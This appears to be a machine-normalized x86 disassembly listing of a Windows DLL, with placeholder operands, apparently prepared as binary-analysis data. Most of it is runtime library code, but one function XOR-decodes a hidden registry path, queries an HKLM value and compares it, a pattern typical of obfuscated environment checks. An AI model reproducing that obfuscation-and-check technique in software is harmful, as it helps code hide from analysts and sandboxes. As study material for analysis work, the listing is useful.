mov [ edi + 0x4 ] 0x0
sub_10047e70
push ebp
mov ebp esp
push 0xffffffff
push sub_10089276
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi ] r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_1005fd90
mov eax [ edi + 0x384 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ edi + 0x3a0 ]
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov eax [ edi + 0x3c0 ]
cmp eax esi
je r-xdata
mov ebx [ eax ]
mov [ ebp - 0x18 ] ebx
cmp ebx esi
je r-xdata
mov [ edi + 0x3c0 ] esi
mov [ edi + 0x3c4 ] esi
mov [ edi + 0x3c8 ] esi
mov eax [ edi + 0x3b0 ]
cmp eax esi
je r-xdata
push eax
call sub_100187af
add esp 0x4
add eax 0x4
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
jne r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax + 0x4 ]
lea edi [ ebx + 0x80 ]
mov [ ebp - 0x24 ] edi
mov [ ecx + edi - 0x60 ] r--data
test [ edi - 0x8 ] 0x1
lea esi [ edi - 0x48 ]
mov [ ebp - 0x28 ] esi
mov [ esi ] r--data
je r-xdata
mov [ edi + 0x3b0 ] esi
mov [ edi + 0x3b4 ] esi
mov [ edi + 0x3b8 ] esi
mov eax [ edi + 0x3a0 ]
cmp eax esi
je r-xdata
mov ebx [ edi + 0x3b4 ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x20 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x30 ]
mov [ edx ] 0x0
mov eax [ esi + 0x14 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x24 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x34 ]
mov [ edx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x6
mov eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ edx ]
push eax
call sub_100187af
add esp 0x4
mov [ edi + 0x3a0 ] esi
mov [ edi + 0x3a4 ] esi
mov [ edi + 0x3a8 ] esi
cmp [ edi + 0x34 ] 0x10
jb r-xdata
push eax
call sub_100187af
add esp 0x4
mov ecx [ edi + 0x3b0 ]
push ecx
call sub_100187af
add esp 0x4
xor esi esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
call sub_1001c957
mov [ ebp - 0x4 ] 0x4
mov eax [ esi - 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + esi - 0x18 ] r--data
mov edx [ esi - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
mov ecx [ esi - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + esi - 0x18 ] r--data
push edi
mov [ edi ] r--data
call sub_1005fbb8
add esp 0x4
mov [ ebp - 0x4 ] 0x3
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
test ecx ecx
je r-xdata
mov [ edi + 0x34 ] 0xf
mov [ edi + 0x30 ] esi
mov [ edi + 0x20 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi + 0x20 ]
push edx
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x24
cmp esi ebx
jne r-xdata
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebx + 0x18 ] 0x7
mov [ ebx + 0x14 ] 0x0
push ebx
mov [ ebx + 0x4 ] cx
call sub_100187af
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
add esp 0x4
xor esi esi
mov eax [ ebx + 0x4 ]
push eax
call sub_100187af
add esp 0x4
push eax
call sub_100187af
add esp 0x4
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_10034e98
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x4 ]
neg ebx
sbb ebx ebx
lea ecx [ ebp - 0x20 ]
not ebx
call sub_10069747
and ebx [ ebp - 0x10 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
dec eax
mov [ ecx + 0x4 ] eax
sub_1004813d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10050c05
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100091c8
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100091c8
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_10048210
push ebp
mov ebp esp
push 0xffffffff
push sub_100891b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov eax ecx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
lea esi [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10037e00
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov ecx edx
cmp eax 0x10
jae r-xdata
add ecx [ ebp - 0x1c ]
cmp eax 0x10
mov eax edx
jae r-xdata
lea ecx [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x48 ] dx
mov edx [ ebp - 0x4c ]
push edx
push ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
call sub_1005c040
lea edx [ ebp - 0x48 ]
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_10064c10
cmp [ ebp - 0x34 ] 0x8
mov esi eax
jb r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100187af
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
sub_10048300
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10057d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10001dc0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10045ad0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100483bc
push 0x38
mov eax sub_1008581d
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100424ab
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060a86
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_1004846a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_1005bb4f
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1006299d
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1001e7b9
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_100484ef
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10048ac0
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10048520
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ esp + 0xc ]
call sub_1001f460
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
movzx ecx ax
mov edx 0xffff
cmp dx cx
je r-xdata
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
add [ esp + 0x10 ] 0x1
mov [ eax - 0x2 ] cx
mov [ ebp + 0x8 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
lea edi [ esi + esi ]
push edi
push edx
push eax
call sub_1007f5d0
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x20 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10048620
push ebp
mov ebp esp
sub esp 0x2b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff82
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x48 ]
push edx
push 0x80000002
mov [ ebp - 0x16 ] ax
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x2c
call sub_100367b0
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x2ac ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2a8 ]
[ edi ]
lea edx [ ebp - 0x2b4 ]
mov eax 0xa
mov [ ebp - 0x2b0 ] 0x206
call sub_100367b0
lea eax [ ebp - 0x2b0 ]
push eax
mov eax [ ebp - 0x2ac ]
lea ecx [ ebp - 0x2a8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
pop edi
test eax eax
je r-xdata
lea edx [ ebp - 0x2a8 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x14 ]
mov eax 0x22
call sub_100367b0
mov eax edx
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
call sub_1005f3a1
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x2ac ]
push ecx
jmp r-xdata
mov eax [ ebp - 0x2ac ]
push eax
mov edx [ ebp - 0x2ac ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ RegCloseKey@IAT ]
sub_1004879e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
lea eax [ ecx + 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_10026e29
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_100487f0
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_10046f10
mov esi [ esi ]
push ebx
call sub_100187af
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_1004883d
push 0x4c
mov eax sub_100855da
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx edi
mov [ ebp - 0x48 ] ebx
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_10071f2c
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
call sub_10034a80
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000ff3d
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ edi + 0x24 ] 0x0
mov eax [ edi + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
and [ ebp - 0x30 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x58 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1002b7bf
mov ecx [ eax ]
push [ ebp - 0x30 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x3c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x44 ]
mov [ ebp + 0x14 ] eax
push ebx
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call sub_1006ff82
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
mov eax [ ebp - 0x44 ]
call sub_1004642f
retn
cmp eax 0x100
lea eax [ ebp - 0x4c ]
je r-xdata
cmp eax [ ebp - 0x34 ]
jbe r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1001b67e
mov ecx [ eax ]
push [ ebp - 0x30 ]
add esi [ ebp - 0x38 ]
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x4c ]
push eax
push ebx
call sub_1006ff82
add esp 0x30
push [ ebp - 0x30 ]
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1006ff82
add esp 0x18
jmp r-xdata
sub eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x30 ] 0x0
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov ebx [ ebp - 0x34 ]
jmp r-xdata
test al al
jle r-xdata
mov ebx [ ebp - 0x48 ]
mov ecx ebx
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub ebx eax
mov eax [ ebp - 0x34 ]
sub eax ebx
inc eax
push eax
lea ecx [ esi + ebx ]
push ecx
push eax
lea eax [ esi + ebx + 0x1 ]
push eax
mov [ ebp - 0x54 ] ecx
call sub_100060f2
mov eax [ ebp - 0x54 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp - 0x34 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x30 ] eax
sub_10048a48
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0xc ]
call sub_10034e74
test [ ebp + 0x8 ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
pop ebp
retn 0x8
sub_10048a74
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax r--data
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
ja r-xdata
cmp [ ebp + 0x14 ] 0x4
ja r-xdata
lea eax [ eax + ecx * 2 ]
imul eax eax 0x5
add eax [ ebp + 0x14 ]
lea eax [ eax * 4 + r--data ]
jmp r-xdata
push 0x4
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1005b1c7
add esp 0x10
pop ebp
retn 0x10
sub_10048ae0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
sub eax 0x0
push edi
je r-xdata
mov ecx [ esi + 0x18 ]
mov edi [ ebp + 0x8 ]
push ecx
push edi
call sub_10021f70
mov edx [ esi + 0x1c ]
push edx
push edi
call sub_10021f70
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_10021f70
add esp 0x18
dec eax
je r-xdata
xor edi edi
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ esi + 0x20 ] edi
jbe r-xdata
sub eax 0x2
jne r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call sub_10021f70
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov edi edi
pop edi
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10021f70
add esp 0x8
pop edi
pop esi
pop ebp
retn
inc edi
cmp edi [ esi + 0x20 ]
jb r-xdata
push eax
push ebx
call sub_10055ac0
add esp 0x8
mov edx [ esi + 0x1c ]
mov eax [ edx + edi * 4 ]
test eax eax
je r-xdata
sub_10048ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088722
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_10069df0
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
push eax
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_100404a0
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_10069df0
push 0xffffffff
push eax
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_100404a0
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_10048c94
push 0x194
mov eax sub_10085956
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10059fdf
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_100129d7
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_10034a80
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10013990
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_10018550
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10063060
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10063060
mov eax [ ebp - 0x188 ]
call sub_1004642f
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10060b30
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_10034a80
jmp r-xdata
mov ecx [ ebp - 0x174 ]
